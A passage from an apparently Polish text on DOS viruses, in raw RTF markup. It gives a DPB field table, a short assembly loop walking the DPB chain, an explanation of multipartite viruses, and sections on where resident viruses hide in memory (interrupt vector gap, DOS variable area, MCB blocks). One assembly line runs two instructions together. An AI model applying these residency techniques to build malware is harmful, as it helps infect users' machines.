\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pe\uc1\u322\'b3ny opis bloku DPB zawarto w poni\uc1\u380\'bf}{\f1\fs24\lang1045{\*\listtag0}szej tabeli. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format bloku DPB}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:8968900}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer dysku A:=0, B:=1, C:=2}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Numer jednostki w programie obs\uc1\u322\'b3ugi }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0} Wielko\uc1\u347\'9c\uc1\u263\'e6 sektora w bajtach}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}log2 (liczba sektor\'f3w w JAP)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Liczba zarezerwowanych sektor\'f3w na pocz\uc1\u261\'b9tku dysku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0} Ilo\uc1\u347\'9c\uc1\u263\'e6 kopii tablicy FAT (najcz\uc1\u281\'ea\uc1\u347\'9cciej 2) }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}09-0A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Maksymalna ilo\uc1\u347\'9c\uc1\u263\'e6 plik\'f3w w katalogu g\uc1\u322\'b3\'f3wnym }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0B-0C}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Pierwszy sektor danych }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0F-10}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Liczba sektor\'f3w na FAT }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}11-12}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer pierwszego sektora katalogu }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}13-16}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Daleki wska\uc1\u378\'9fnik do programu obs\uc1\u322\'b3ugi dysku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Bajt identyf}{\f0\fs24\lang1045{\*\listtag0}ikacji no\uc1\u347\'9cnika}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Znacznik dost\uc1\u281\'eapu do dysku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}19-1C}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Daleki wska\uc1\u378\'9fnik do nast\uc1\u281\'eapnego bloku DPB }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1D-1E}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer pierwszej wolnej JAP na dysku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1F-20}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Liczba wolnych JAP na dysku}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Adres pierwszego bloku DPB uzyskiwany jest najcz\uc1\u281\'ea\uc1\u347\'9cciej przy u\uc1\u380\'bfyciu funkcji (52/21). Na podstawie danych w pierwszym DPB mo\uc1\u380\'bfna przej\uc1\u347\'9c\uc1\u263\'e6 (poruszaj\uc1\u261\'b9c si\uc1\u281\'ea po li\uc1\u347\'9ccie) do kolejnych blok\'f3w DPB. Realizuje to poni\uc1\u380\'bfsza sekwencja:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przeszukiwanie \uc1\u322\'b3a\uc1\u324\'f1cucha DPB}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov AH,52h              ; funkcja DOS - pobierz adres do listy list (LL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                 ; wywo\uc1\u322\'b3aj DOS po wywo\uc1\u322\'b3aniu ES:BX zawiera adres do LL, w          }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                         ; kom\'f3rkach od ES:[BX] do ES:[BX+3] znajduje \tab             }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                         ; si\uc1\u281\'ea daleki wska\uc1\u378\'9fnik do pierwszego DPB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LES BX,ES:[BX]          ; ES:BX wskazuje na pierwszy DPB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nast\uc1\u281\'eapnyDPB:            ; pocz\uc1\u261\'b9tek p\uc1\u281\'eatli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LDS SI, ES:[BX+13h]     ; DS:SI wskazuje teraz na program obs\uc1\u322\'b3ugi LES BX,ES:[BX+19h]          ; ES:BX wskazuje teraz na nast\uc1\u281\'eapny bloku DPB, je\uc1\u380\'bfeli jest        }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                         ; to ostatni blok, to ES i BX zawieraj\uc1\u261\'b9 OFFFFh, }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,ES\tab \tab      ; we\uc1\u378\'9f segment }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,0FFFFh           ; czy ES=OFFFFh ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNZ Nast\uc1\u281\'eapnyDPB         ; je\uc1\u347\'9cli nie, to jest jeszcze kolejny DPB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP BX,AX               ; czy BX=OFFFFh? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNZ Nast\uc1\u281\'eapnyDPB         ; je\uc1\u347\'9cli nie, to jest jeszcze kolejny DPB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.5. Wirusy kombinowane (ang: }{\f1\fs24\i\b\lang1045{\*\listtag0}multipartition}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tego typu wirusy s\uc1\u261\'b9 wirusami zawieraj\uc1\u261\'b9cymi mechanizmy infekcji r\'f3\uc1\u380\'bfnych obiekt\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku, gdy wirus zara\uc1\u380\'bfa pliki uruchamialne (EXE, COM), a tak\uc1\u380\'bfe sektor tablicy partycji oraz ewentualnie BOOT-sektory i inne pliki, nazywa si\uc1\u281\'ea go wirusem typu multipartition. Ze wzgl\uc1\u281\'eadu na szerok\uc1\u261\'b9 gam\uc1\u281\'ea zara\uc1\u380\'bfanych przez siebie ofiar, wirusy tego typu bardzo szybko rozprzestrzeniaj\uc1\u261\'b9 si\uc1\u281\'ea w systemie komputerowym.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pami\uc1\u281\'ea\uc1\u263\'e6 przydzielana programom przez system DOS jest zwalniana zaraz po ich zako\uc1\u324\'f1czeniu, st\uc1\u261\'b9d te\uc1\u380\'bf wirus rezydentny, chc\uc1\u261\'b9c przejmowa\uc1\u263\'e6 przerwania, musi wygospodarowa\uc1\u263\'e6 sobie jaki\uc1\u347\'9c fragment w pami\uc1\u281\'eaci, do kt\'f3rego mo\uc1\u380\'bfe si\uc1\u281\'ea skopiowa\uc1\u263\'e6, aby nie zosta\uc1\u263\'e6 zamazanym przez kod}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}innego programu, wczytywanego do zwolnionych przez system obszar\'f3w pami\uc1\u281\'eaci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do instalacji mo\uc1\u380\'bfna wykorzysta\uc1\u263\'e6 dowolny fragment pami\uc1\u281\'eaci, kt\'f3ry na pewno nie zostanie wykorzystany i zamazany przez \uc1\u380\'bfaden inny program (co sko\uc1\u324\'f1czy\uc1\u322\'b3oby si\uc1\u281\'ea pr\uc1\u281\'eadzej czy p\'f3\uc1\u378\'9fniej zawieszeniem komputera, gdy\uc1\u380\'bf zosta\uc1\u322\'b3aby zamazana procedura obs\uc1\u322\'b3ugi przej\uc1\u281\'eatego przerwania).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 5}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.1. Instalacja w tablicy wektor\'f3w przerwa\uc1\u324\'f1}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W komputerze IBM na u\uc1\u380\'bfytek przerwa\uc1\u324\'f1 przeznaczono 256*4=1024 bajt\'f3w znajduj\uc1\u261\'b9cych si\uc1\u281\'ea na pocz\uc1\u261\'b9tku pami\uc1\u281\'eaci operacyjnej od adresu 0000:0000 do adresu 0000:0400 (tak sprawa ma si\uc1\u281\'ea oczywi\uc1\u347\'9ccie w trybie rzeczywistym i V86 procesor\'f3w 80x86). Mimo to wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 program\'f3w wykorzystuje tylko przerwania poni\uc1\u380\'bfej numeru 80h, tak wi\uc1\u281\'eac w obszarze 0000:0200-0000:0400 pojawia si\uc1\u281\'ea 512-ba}{\f1\fs24\lang1045{\*\listtag0}j}{\f0\fs24\lang1045{\*\listtag0}towa luka, w kt\'f3rej mo\uc1\u380\'bfna umie\uc1\u347\'9cci\uc1\u263\'e6 kod wirusa. Najcz\uc1\u281\'ea\uc1\u347\'9cciej obszar ten jest wykorzystywany przez wirusy bardzo kr\'f3tkie, potrzebuj\uc1\u261\'b9ce do swych cel\'f3w ma\uc1\u322\'b3ego obszaru pami\uc1\u281\'eaci operacyjnej,}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.2. Instalacja w obszarze zmiennych DOS}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W obszarze pami\uc1\u281\'eaci od adresu 0000:0600 do adresu 0000:0700 znajduje si\uc1\u281\'ea obszar wykorzystywany przy starcie systemu. Po za\uc1\u322\'b3adowaniu obszar ten zawiera nieistotne dane systemu (w zasadzie nie u\uc1\u380\'bfywane), dzi\uc1\u281\'eaki czemu jest to kolejna luka w pami\uc1\u281\'eaci systemu, w kt\'f3rej mo\uc1\u380\'bfna umie\uc1\u347\'9cci\uc1\u263\'e6 kr\'f3tkiego}{\f1\fs24\lang1045{\*\listtag0} (maksymalnie 256-bajtowego) wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.3. Instalacja w pami\uc1\u281\'eaci poni\uc1\u380\'bfej 640kB i UMB}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zarz\uc1\u261\'b9dzaj\uc1\u261\'b9c pami\uc1\u281\'eaci\uc1\u261\'b9 operacyjn\uc1\u261\'b9 system DOS dzieli j\uc1\u261\'b9 na po\uc1\u322\'b3\uc1\u261\'b9czone w \uc1\u322\'b3a\uc1\u324\'f1cuch bloki, z kt\'f3rych ka\uc1\u380\'bfdy rozpoczyna si\uc1\u281\'ea tzw. nag\uc1\u322\'b3\'f3wkiem MCB (ang. Memory Control B\uc1\u322\'b3ock). Ka\uc1\u380\'bfdy nag\uc1\u322\'b3\'f3wek zajmuje 16 bajt\'f3w i jest ulokowany zawsze na granicy paragrafu (16 bajt\'f3w), a zarz\uc1\u261\'b9dzany przeze\uc1\u324\'f1 blok pami\uc1\u281\'eaci zaczyna si\uc1\u281\'ea bezpo\uc1\u347\'9crednio po nim, tak\uc1\u380\'bfe od granicy paragrafu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfszy mechanizm stosowany jest zar\'f3wno dla pami\uc1\u281\'eaci niskiej (poni\uc1\u380\'bfej 640kB - LMB; ang. Low Memory Blocks), jak i dla pami\uc1\u281\'eaci wysokiej (powy\uc1\u380\'bfej 640kB - UMB; ang. Upper Memory Blocks). Format bloku MCB pokazano w poni\uc1\u380\'bfszej tabeli.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format MCB}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:89658f0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
